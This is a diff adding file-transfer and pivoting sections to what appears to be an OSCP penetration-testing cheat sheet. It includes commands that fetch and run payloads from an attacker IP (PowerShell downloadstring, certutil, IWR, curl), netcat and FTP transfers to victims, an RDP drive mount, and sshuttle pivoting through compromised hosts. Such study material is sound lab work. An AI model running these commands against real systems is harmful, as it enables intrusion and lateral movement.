@@ -144,3 +144,61 @@ It’s also possible to specify which path to share, for example:
 ~~~
 sudo python3 -m http.server 80 --dir /home/kali/tools
 ~~~
+##### Windows
+~~~
+iex(new-object net.webclient).downloadstring("http://192.168.42.42/evil.ps1)
+certutil.exe -urlcache -split -f "http://192.168.42.42/nc.exe" nc.exe
+IWR -Uri "http://192.168.42.42/n64.exe" -Outfile "n64.exe"
+~~~
+Linux
+~~~
+curl http://192.168.42.42/evil.php --output evil.php
+~~~
+##### FTP
+If there is an ftp server which we have access, we can upload files there through it, the "” is the same for both, windows or linux:
+~~~
+Connect and login with:
+
+ftp 192.168.42.42
+
+Upload the files with:
+
+put evil.py
+
+Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:
+
+pass
+
+followed by enter
+~~~
+###### Sockets
+Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same. Create the socket with:
+
+Attacker:
+~~~
+  nc -lvnp 443 < evil.php
+  ~~~
+
+For both cases from windows, the only difference is to write nc.exe
+
+Victim:
+~~~
+  nc -v 192.168.42.42 443 > evil.php
+  ~~~
+ ###### RDP
+If we have access to a windows machine with a valid user/credentials and this user is in the “Remote Desktop Users”, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:
+~~~
+rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+~~~
+##### Pivoting
+It’s possible to do pivoting by using proxychains, pure nc’s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it’s a transparent proxy server that works like “a vpn”, and doesn’t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn’t work through sshuttle.
+
+###### sshuttle
+One hop
+Let’s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a “vpn” to talk directly to those servers, for that, we use:
+~~~
+sshuttle ceso@192.168.20.35 192.168.30.0/24
+~~~
+###### Multi-hops
+Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a “vpn” through this multiple hops, so…putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn’t intend to provide a 100% precise network diagram):
+
